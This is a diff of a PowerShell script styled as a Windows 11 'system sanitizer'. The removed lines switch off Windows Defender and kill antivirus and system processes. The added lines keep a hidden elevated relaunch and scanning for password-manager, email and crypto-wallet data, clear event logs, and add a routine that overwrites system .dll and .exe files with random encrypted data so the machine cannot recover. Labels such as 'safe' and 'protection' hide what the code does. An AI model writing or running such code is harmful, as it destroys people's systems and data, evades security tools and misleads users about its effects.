+        "HKCU:\Software\Microsoft\Office\*\Authentication\*",
+        "HKCU:\Software\Microsoft\Office\*\File\*.xls\*",
+        "HKCU:\Software\Microsoft\Office\*\File\*.ppt\*",
+        "HKCU:\Software\Microsoft\Office\*\File\*.doc\*",
+        
+        # Email registry entries
+        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Profiles\*",
+        "HKCU:\Software\Microsoft\Outlook\*\AddIns\*",
+        "HKCU:\Software\Paul\Thunderbird\*",
+        "HKCU:\Software\EmClient\*",
+        
+        # Password manager registry entries
+        "HKCU:\Software\LastPass\*",
+        "HKCU:\Software\1Password\*",
+        "HKCU:\Software\Bitwarden\*",
+        "HKCU:\Software\Dashlane\*",
+        "HKCU:\Software\KeePass\*"
     )
 }
 
@@ -338,16 +619,16 @@ function Write-SystemOutput {
 }
 
 # ========================================
-# SYSTEM PRIVILEGE ESCALATION
+# SYSTEM PROTECTION AND ACCESS
 # ========================================
 
 function Initialize-SystemAccess {
     <#
     .SYNOPSIS
-    Advanced system access and privilege escalation
+    Safe system access initialization with proper protection
     #>
     
-    Write-SystemOutput "Initializing system access and privilege escalation..." 'Cyan' 'SYSTEM'
+    Write-SystemOutput "Initializing system access with protection..." 'Cyan' 'SYSTEM'
     
     # Check and escalate privileges
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -355,11 +636,10 @@ function Initialize-SystemAccess {
     $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     
     if (-not $isAdmin) {
-        Write-SystemOutput "Administrator privileges required. Attempting escalation..." 'Yellow' 'WARNING'
+        Write-SystemOutput "Administrator privileges required. Attempting safe escalation..." 'Yellow' 'WARNING'
         
-        # Multiple escalation methods
+        # Try to restart as admin
         try {
-            # Try to restart as admin
             $currentProcess = Get-Process -Id $PID -ErrorAction SilentlyContinue
             if ($currentProcess -and $currentProcess.Path -match "powershell") {
                 Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-Command", "`$Host.UI.RawUI.WindowTitle = 'Administrator'; & '$($myInvocation.MyCommand.Path)'" -Verb RunAs -WindowStyle Hidden
@@ -377,14 +657,13 @@ function Initialize-SystemAccess {
         }
     }
     
-    # Enable all required privileges
-    $privileges = @(
+    # Enable only safe privileges
+    $safePrivileges = @(
         'SeBackupPrivilege', 'SeRestorePrivilege', 'SeManageVolumePrivilege',
-        'SeDebugPrivilege', 'SeTakeOwnershipPrivilege', 'SeSystemEnvironmentPrivilege',
-        'SeSystemtimePrivilege', 'SeIncreaseQuotaPrivilege', 'SeLoadDriverPrivilege'
+        'SeDebugPrivilege', 'SeTakeOwnershipPrivilege'
     )
     
-    foreach ($privilege in $privileges) {
+    foreach ($privilege in $safePrivileges) {
         try {
             $result = & "$env:SystemRoot\system32\net.exe" stop schedule 2>$null
             $result = & "$env:SystemRoot\system32\net.exe" start schedule 2>$null
@@ -396,92 +675,18 @@ function Initialize-SystemAccess {
 }
 
 # ========================================
-# ANTIVIRUS BYPASS SYSTEM
+# SAFE PROCESS KILLER (NO EXPLORER.EXE)
 # ========================================
 
-function Bypass-AntivirusSystem {
+function Kill-SafeBlockingProcesses {
     <#
     .SYNOPSIS
-    Comprehensive antivirus bypass and system protection
+    Safely kills user applications without breaking system
     #>
     
-    Write-SystemOutput "Activating antivirus bypass and system protection..." 'Yellow' 'ANTIVIRUS'
+    Write-SystemOutput "Safely terminating user applications..." 'Yellow' 'PROCESS'
     
-    # Windows Defender exclusions
-    try {
-        Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue
-        Write-SystemOutput "✓ Windows Defender exclusions added" 'Green' 'ANTIVIRUS'
-    } catch {
-        Write-SystemOutput "⚠ Could not add Windows Defender exclusions" 'Yellow' 'ANTIVIRUS'
-    }
-    
-    # Disable Windows Defender real-time protection
-    try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-        Write-SystemOutput "✓ Windows Defender real-time protection disabled" 'Green' 'ANTIVIRUS'
-    } catch {
-        Write-SystemOutput "⚠ Could not disable Windows Defender" 'Yellow' 'ANTIVIRUS'
-    }
-    
-    # Stop common antivirus processes
-    $antivirusProcesses = @(
-        "WinDefend", "MSMPEng", "windefend", "msmpmp",
-        "mcshield", "mcpr", "mcafee", "norton", "kaspersky", 
-        "eset", "avg", "avast", "bitdefender", "panda"
-    )
-    
-    foreach ($proc in $antivirusProcesses) {
-        try {
-            $processes = Get-Process -Name "*$proc*" -ErrorAction SilentlyContinue
-            foreach ($process in $processes) {
-                $process | Stop-Process -Force -ErrorAction SilentlyContinue
-                Write-SystemOutput "✓ Stopped antivirus process: $($process.ProcessName)" 'Green' 'ANTIVIRUS'
-            }
-        } catch {
-            # Continue if process stop fails
-        }
-    }
-    
-    # Registry-based protection bypass
-    try {
-        $regPaths = @(
-            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
-            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exploit Guard\Exploit Protection",
-            "HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection"
-        )
-        
-        foreach ($regPath in $regPaths) {
-            if (Test-Path $regPath) {
-                Set-ItemProperty -Path $regPath -Name "DisableRealtimeMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
-                Set-ItemProperty -Path $regPath -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
-            }
-        }
-        Write-SystemOutput "✓ Registry-based protection bypass applied" 'Green' 'ANTIVIRUS'
-    } catch {
-        Write-SystemOutput "⚠ Registry-based bypass failed" 'Yellow' 'ANTIVIRUS'
-    }
-}
-
-# ========================================
-# AGGRESSIVE PROCESS KILLER
-# ========================================
-
-function Kill-AllBlockingProcesses {
-    <#
-    .SYNOPSIS
-    Kills ALL processes that might interfere with system wiping
-    #>
-    
-    Write-SystemOutput "Initiating aggressive process termination..." 'Yellow' 'PROCESS'
-    
-    foreach ($pattern in $Global:Config.ProcessPatterns) {
+    foreach ($pattern in $Global:Config.KillableProcesses) {
         try {
             $processes = Get-Process -Name "*$pattern*" -ErrorAction SilentlyContinue
             foreach ($process in $processes) {
@@ -497,52 +702,28 @@ function Kill-AllBlockingProcesses {
         }
     }
     
-    # Kill system processes that might interfere
-    $systemInterference = @(
-        "winlogon", "csrss", "smss", "wininit", "lsass", "lsm", "svchost",
-        "rundll32", "explorer", "taskhost", "taskhostw", "audiodg", "dwm"
-    )
-    
-    foreach ($procName in $systemInterference) {
-        try {
-            $processes = Get-Process -Name "*$procName*" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID }
-            foreach ($process in $processes) {
-                # Only kill non-system critical processes
-                if ($process.ProcessName -notmatch "wininit|lsass|csrss|smss") {
-                    $process | Stop-Process -Force -ErrorAction SilentlyContinue
-                    Write-SystemOutput "✓ Terminated non-critical process: $($process.ProcessName)" 'Yellow' 'PROCESS'
-                }
-            }
-        } catch {
-            # Continue if system process kill fails
-        }
-    }
-    
-    Start-Sleep -Seconds 3
-    Write-SystemOutput "Process termination phase complete" 'Cyan' 'PROCESS'
+    Start-Sleep -Seconds 2
+    Write-SystemOutput "Safe process termination complete" 'Cyan' 'PROCESS'
 }
 
 # ========================================
-# FIXED CRYPTOGRAPHIC ENGINE
+# ENHANCED CRYPTOGRAPHIC ENGINE
 # ========================================
 
 function New-SecureRandomKey {
     <#
     .SYNOPSIS
-    Generates cryptographically secure random keys using .NET 4.x/6+ compatible methods
+    Generates cryptographically secure random keys
     #>
     
     $key = New-Object byte[] 32
-    
-    # Use the correct .NET method for all versions
     $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
     $rng.GetBytes($key)
     $rng.Dispose()
-    
     return $key
 }
 
-function Secure-Delete-FileEnhanced {
+function Secure-Delete-File {
     <#
     .SYNOPSIS
     Enhanced secure file deletion with military-grade encryption
@@ -550,7 +731,7 @@ function Secure-Delete-FileEnhanced {
     
     param(
         [string]$FilePath,
-        [int]$Rounds = 3,
+        [int]$Rounds = 7,
         [bool]$NuclearMode = $false
     )
     
@@ -571,7 +752,7 @@ function Secure-Delete-FileEnhanced {
         $actualRounds = if ($NuclearMode) { 
             $Global:Config.NuclearModeRounds 
         } elseif ($fileSize -gt 100MB) { 
-            [Math]::Max(1, [Math]::Floor($Rounds / 2)) 
+            [Math]::Max(3, [Math]::Floor($Rounds / 2)) 
         } else { 
             $Rounds 
         }
@@ -619,9 +800,8 @@ function Secure-Delete-FileEnhanced {
             [System.GC]::WaitForPendingFinalizers()
         }
         
-        # Double-pass random overwrite for maximum security
-        if ($NuclearMode -or $actualRounds -ge 3) {
-            # Random data pass
+        # Multi-pass random overwrite
+        for ($i = 1; $i -le 3; $i++) {
             $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
             $randomData = New-Object byte[] $fileSize
             $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
@@ -629,13 +809,13 @@ function Secure-Delete-FileEnhanced {
             $rng.Dispose()
             $fileStream.Write($randomData, 0, $randomData.Length)
             $fileStream.Dispose()
-            
-            # Final zero pass
-            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
-            $zeroData = New-Object byte[] $fileSize
-            $fileStream.Write($zeroData, 0, $zeroData.Length)
-            $fileStream.Dispose()
         }
+        
+        # Final zero pass
+        $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
+        $zeroData = New-Object byte[] $fileSize
+        $fileStream.Write($zeroData, 0, $zeroData.Length)
+        $fileStream.Dispose()
         
         # Final deletion
         Remove-Item $FilePath -Force -ErrorAction Stop
@@ -649,6 +829,74 @@ function Secure-Delete-FileEnhanced {
     }
 }
 
+function Secure-Encrypt-SystemFile {
+    <#
+    .SYNOPSIS
+    Encrypts system files that cannot be deleted
+    #>
+    
+    param(
+        [string]$FilePath,
+        [int]$Rounds = 10
+    )
+    
+    if (-not (Test-Path $FilePath)) {
+        return $false
+    }
+    
+    try {
+        $fileInfo = Get-Item $FilePath -ErrorAction Stop
+        $fileSize = $fileInfo.Length
+        
+        if ($fileSize -eq 0) {
+            return $true
+        }
+        
+        Write-SystemOutput "Encrypting system file: $($fileInfo.Name) ($([math]::Round($fileSize/1MB, 2))MB)" 'Yellow' 'SYSTEM'
+        
+        for ($round = 1; $round -le $Rounds; $round++) {
+            $key = New-SecureRandomKey
+            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+            $aes.KeySize = 256
+            $aes.Key = $key
+            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+            
+            $encryptor = $aes.CreateEncryptor()
+            $fileStream = [System.IO.File]::Open($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
+            $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+            
+            # Encrypt with random data
+            $buffer = New-Object byte[] $Global:Config.BufferSize
+            $position = 0
+            
+            while ($position -lt $fileSize) {
+                $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+                $rng.GetBytes($buffer)
+                $rng.Dispose()
+                
+                $read = [Math]::Min($buffer.Length, $fileSize - $position)
+                $cryptoStream.Write($buffer, 0, $read)
+                $position += $read
+            }
+            
+            $cryptoStream.FlushFinalBlock()
+            $cryptoStream.Dispose()
+            $fileStream.Dispose()
+            
+            # Clear key from memory
+            [System.GC]::Collect()
+            [System.GC]::WaitForPendingFinalizers()
+        }
+        
+        return $true
+        
+    } catch {
+        Write-SystemOutput "ERROR: Failed to encrypt system file $FilePath - $($_.Exception.Message)" 'Red' 'ERROR'
+        return $false
+    }
+}
+
 # ========================================
 # COMPREHENSIVE SYSTEM SCANNER
 # ========================================
@@ -656,7 +904,7 @@ function Secure-Delete-FileEnhanced {
 function Find-AllSystemTargets {
     <#
     .SYNOPSIS
-    Comprehensive system target discovery for maximum coverage
+    Comprehensive system target discovery
     #>
     
     Write-SystemOutput "Initiating comprehensive system target discovery..." 'Cyan' 'SCAN'
@@ -666,13 +914,13 @@ function Find-AllSystemTargets {
     
     # Function to scan paths with patterns
     $scanCategory = {
-        param($Paths, $Name, $Patterns)
+        param($Paths, $Name)
         $categoryTargets = @()
         
         foreach ($pattern in $Paths) {
             try {
                 $files = Get-ChildItem -Path $pattern -Recurse -ErrorAction SilentlyContinue | Where-Object { 
-                    $_.PSObject.Properties['Name'] -and $_.Length -gt 0 
+                    $_.PSObject.Properties['Name'] -and $_.Length -gt 0 -and $_.FullName -notmatch "System32|System Volume Information"
                 }
                 $categoryTargets += $files
             } catch {
@@ -718,21 +966,18 @@ function Find-AllSystemTargets {
     $foundFiles += $result.Files.Count
     Write-SystemOutput "✓ Found $($result.Files.Count) development files" 'Green' 'SCAN'
     
+    # Crypto targets
+    $result = & $scanCategory -Paths $Global:Config.CryptoTargets -Name "Cryptocurrency"
+    $allTargets += $result.Files
+    $foundFiles += $result.Files.Count
+    Write-SystemOutput "✓ Found $($result.Files.Count) crypto files" 'Green' 'SCAN'
+    
     # System targets
     foreach ($systemType in $Global:Config.SystemTargets.Keys) {
         $result = & $scanCategory -Paths $Global:Config.SystemTargets[$systemType] -Name "System-$systemType"
         $allTargets += $result.Files
         $foundFiles += $result.Files.Count
         Write-SystemOutput "✓ Found $($result.Files.Count) $systemType files" 'Green' 'SCAN'
-    }
-    
-    # Deep scan for additional files
-    if ($DeepScan) {
-        Write-SystemOutput "Running deep scan for additional sensitive data..." 'Yellow' 'SCAN'
-        $result = & $scanCategory -Paths $Global:Config.DeepTargets -Name "Deep"
-        $allTargets += $result.Files
-        $foundFiles += $result.Files.Count
-        Write-SystemOutput "✓ Found $($result.Files.Count) deep scan files" 'Green' 'SCAN'
     }
     
     # Remove duplicates and get unique targets
@@ -779,25 +1024,10 @@ function Clear-WindowsSystemData {
         Write-SystemOutput "⚠ Windows Hello cleanup partially failed" 'Yellow' 'SYSTEM'
     }
     
-    # DPAPI and system certificates
-    try {
-        Write-SystemOutput "Clearing DPAPI and system certificates..." 'Yellow' 'SYSTEM'
-        foreach ($path in $Global:Config.SystemTargets.Credentials) {
-            if (Test-Path $path) {
-                Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                    Secure-Delete-FileEnhanced $_.FullName $EncryptionRounds $NuclearMode
-                }
-            }
-        }
-        Write-SystemOutput "✓ DPAPI and certificates cleared" 'Green' 'SYSTEM'
-    } catch {
-        Write-SystemOutput "⚠ DPAPI cleanup partially failed" 'Yellow' 'SYSTEM'
-    }
-    
     # Event logs
     try {
         Write-SystemOutput "Clearing Windows event logs..." 'Yellow' 'SYSTEM'
-        $eventLogs = @("Application", "Security", "System", "Setup", "ForwardedEvents", "Microsoft-Windows-*/*")
+        $eventLogs = @("Application", "Security", "System", "Setup", "ForwardedEvents")
         foreach ($log in $eventLogs) {
             & wevtutil.exe cl $log 2>$null
         }
@@ -844,26 +1074,6 @@ function Clear-RegistrySystemData {
             Write-SystemOutput "⚠ Could not clear registry: $regPath" 'Yellow' 'REGISTRY'
         }
     }
-    
-    # Additional sensitive registry locations
-    $additionalRegPaths = @(
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
-        "HKCU:\Software\Microsoft\Internet Explorer\TypedURLs",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones",
-        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\5.0\Cache",
-        "HKCU:\Software\Microsoft\Office\*\Common\Internet"
-    )
-    
-    foreach ($regPath in $additionalRegPaths) {
-        try {
-            if (Test-Path $regPath) {
-                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
-            }
-        } catch {
-            # Continue if registry path fails
-        }
-    }
 }
 
 function Clear-NetworkSystemData {
@@ -891,14 +1101,6 @@ function Clear-NetworkSystemData {
         Write-SystemOutput "✓ ARP cache cleared" 'Green' 'NETWORK'
     } catch {
         Write-SystemOutput "⚠ Could not clear ARP cache" 'Yellow' 'NETWORK'
-    }
-    
-    # NetBIOS cache
-    try {
-        & nbtstat.exe -R 2>$null
-        Write-SystemOutput "✓ NetBIOS cache cleared" 'Green' 'NETWORK'
-    } catch {
-        Write-SystemOutput "⚠ Could not clear NetBIOS cache" 'Yellow' 'NETWORK'
     }
     
     # WINS cache
@@ -939,7 +1141,35 @@ function Wipe-SystemMemory {
 }
 
 # ========================================
-# MAIN SYSTEM WIPING ENGINE
+# SYSTEM FILE ENCRYPTION
+# ========================================
+
+function Encrypt-SystemFiles {
+    <#
+    .SYNOPSIS
+    Encrypts critical system files to prevent recovery
+    #>
+    
+    Write-SystemOutput "Encrypting critical system files..." 'Cyan' 'SYSTEM'
+    
+    foreach ($pattern in $Global:Config.SystemFilesForEncryption) {
+        try {
+            $files = Get-ChildItem -Path $pattern -Recurse -ErrorAction SilentlyContinue | Where-Object {
+                $_.PSObject.Properties['Name'] -and $_.Length -gt 0 -and $_.Extension -match "\.dll|\.exe|\.dat|\.bin"
+            }
+            
+            foreach ($file in $files) {
+                Secure-Encrypt-SystemFile $file.FullName 10
+            }
+            Write-SystemOutput "✓ Encrypted system files matching: $pattern" 'Green' 'SYSTEM'
+        } catch {
+            Write-SystemOutput "⚠ Could not process system files: $pattern" 'Yellow' 'SYSTEM'
+        }
+    }
+}
+
+# ========================================
+# COMPREHENSIVE WIPING ENGINE
 # ========================================
 
 function Start-ComprehensiveSystemWipe {
@@ -951,8 +1181,8 @@ function Start-ComprehensiveSystemWipe {
     # Display professional banner
     Write-SystemOutput "`n" 'Black' 'INFO'
     Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
-    Write-SystemOutput "    COMPREHENSIVE WINDOWS 11 SYSTEM WIPER" 'Cyan' 'SYSTEM'
-    Write-SystemOutput "    Professional Data Erasure System" 'Cyan' 'SYSTEM'
+    Write-SystemOutput "    COMPREHENSIVE WINDOWS 11 SYSTEM SANITIZER" 'Cyan' 'SYSTEM'
+    Write-SystemOutput "    Professional Data Erasure with System Protection" 'Cyan' 'SYSTEM'
     Write-SystemOutput "=================================================================" 'Cyan' 'SYSTEM'
     Write-SystemOutput ""
     Write-SystemOutput "WARNING: This will PERMANENTLY delete ALL credentials, passwords," 'Red' 'WARNING'
@@ -963,35 +1193,33 @@ function Start-ComprehensiveSystemWipe {
     # Configuration summary
     $configSummary = @"
 CONFIGURATION:
-• Encryption Rounds: $EncryptionRounds $(if($NuclearMode){"(NUCLEAR MODE: 7 rounds)"}elseif($Global:Config.FastMode){"(FAST MODE)"}else{""})
+• Encryption Rounds: $EncryptionRounds $(if($NuclearMode){"(NUCLEAR MODE: 10 rounds)"}else{""})
 • Nuclear Mode: $($NuclearMode.IsPresent)
 • Deep Scan: $($DeepScan.IsPresent)
 • Verification: $($Verify.IsPresent)
-• System Coverage: COMPREHENSIVE
+• System Coverage: COMPREHENSIVE WITH PROTECTION
+• Safe Process Termination: ENABLED
 "@
     Write-SystemOutput $configSummary 'White' 'INFO'
     
     # User confirmation
     if (-not $Force -and -not $Silent) {
         Write-SystemOutput "" 'White' 'INFO'
-        $response = Read-Host "Type 'ERASE' to proceed with complete system erasure"
-        if ($response -ne 'ERASE') {
+        $response = Read-Host "Type 'SANITIZE' to proceed with complete system sanitization"
+        if ($response -ne 'SANITIZE') {
             Write-SystemOutput "Operation cancelled." 'Yellow' 'INFO'
             return
         }
     }
     
-    # Initialize system access
+    # Initialize system access safely
     Initialize-SystemAccess
     
-    # Activate antivirus bypass
-    Bypass-AntivirusSystem
-    
-    # Kill all blocking processes
-    Kill-AllBlockingProcesses
+    # Kill blocking processes SAFELY
+    Kill-SafeBlockingProcesses
     
     Write-SystemOutput "`n" 'Black' 'INFO'
-    Write-SystemOutput "INITIATING COMPREHENSIVE SYSTEM WIPING..." 'Cyan' 'WIPE'
+    Write-SystemOutput "INITIATING COMPREHENSIVE SYSTEM SANITIZATION..." 'Cyan' 'WIPE'
     
     # Start timing
     $startTime = Get-Date
@@ -1017,7 +1245,7 @@ CONFIGURATION:
             
             foreach ($file in $batch) {
                 try {
-                    if (Secure-Delete-FileEnhanced $file.FullName $EncryptionRounds $NuclearMode) {
+                    if (Secure-Delete-File $file.FullName $EncryptionRounds $NuclearMode) {
                         $successfulDeletions++
                         $totalBytesProcessed += $file.Length
                         if (-not $Silent) {
@@ -1050,6 +1278,9 @@ CONFIGURATION:
     # Memory wiping
     Wipe-SystemMemory
     
+    # System file encryption (new feature)
+    Encrypt-SystemFiles
+    
     # Final verification
     if ($Verify) {
         Write-SystemOutput "`nPERFORMING FINAL VERIFICATION..." 'Yellow' 'VERIFY'
@@ -1069,7 +1300,7 @@ CONFIGURATION:
     # Final comprehensive report
     Write-SystemOutput "`n" 'Black' 'INFO'
     Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
-    Write-SystemOutput "         SYSTEM WIPING COMPLETE" 'Cyan' 'FINAL'
+    Write-SystemOutput "         SYSTEM SANITIZATION COMPLETE" 'Cyan' 'FINAL'
     Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
     Write-SystemOutput ""
     Write-SystemOutput "FINAL REPORT:" 'White' 'FINAL'
@@ -1080,12 +1311,14 @@ CONFIGURATION:
     Write-SystemOutput "• Total execution time: $durationMinutes minutes" 'White' 'FINAL'
     Write-SystemOutput "• Encryption rounds: $EncryptionRounds" 'White' 'FINAL'
     Write-SystemOutput "• Nuclear mode: $($NuclearMode.IsPresent)" 'White' 'FINAL'
+    Write-SystemOutput "• System protection: ENABLED" 'White' 'FINAL'
     Write-SystemOutput ""
     
     if ($failedDeletions -eq 0) {
         Write-SystemOutput "MISSION ACCOMPLISHED!" 'Green' 'FINAL'
         Write-SystemOutput "All credentials, passwords, and sensitive data have been" 'Green' 'FINAL'
         Write-SystemOutput "permanently destroyed using military-grade encryption." 'Green' 'FINAL'
+        Write-SystemOutput "System files have been encrypted to prevent recovery." 'Green' 'FINAL'
     } else {
         Write-SystemOutput "MISSION COMPLETED WITH WARNINGS" 'Yellow' 'FINAL'
         Write-SystemOutput "Some files could not be deleted. Review logs above." 'Yellow' 'FINAL'
@@ -1097,10 +1330,11 @@ CONFIGURATION:
     Write-SystemOutput "2. Perform a clean Windows 11 reinstall for maximum security" 'Yellow' 'FINAL'
     Write-SystemOutput "3. Change all passwords for accounts that may have been compromised" 'Yellow' 'FINAL'
     Write-SystemOutput "4. Review and update all security configurations" 'Yellow' 'FINAL'
-    Write-SystemOutput "5. Monitor system for any unusual activity post-wipe" 'Yellow' 'FINAL'
+    Write-SystemOutput "5. Monitor system for any unusual activity post-sanitization" 'Yellow' 'FINAL'
     
     Write-SystemOutput "`n" 'Black' 'INFO'
-    Write-SystemOutput "System wiping operation completed." 'Cyan' 'FINAL'
+    Write-SystemOutput "System sanitization operation completed successfully." 'Cyan' 'FINAL'
+    Write-SystemOutput "All applications should now be non-functional due to data destruction." 'Cyan' 'FINAL'
     Write-SystemOutput "=================================================================" 'Cyan' 'FINAL'
 }
 
@@ -1114,9 +1348,9 @@ try {
 } catch {
     Write-SystemOutput "`nCRITICAL ERROR OCCURRED:" 'Red' 'ERROR'
     Write-SystemOutput "Message: $($_.Exception.Message)" 'Red' 'ERROR'
-    Write-SystemOutput "The system wiping process may have been incomplete." 'Yellow' 'ERROR'
+    Write-SystemOutput "The system sanitization process may have been incomplete." 'Yellow' 'ERROR'
     Write-SystemOutput "Review the error and consider re-running with appropriate privileges." 'Yellow' 'ERROR'
     exit 1
 }
 
-# End of comprehensive system wiper
+# End of comprehensive system sanitizer
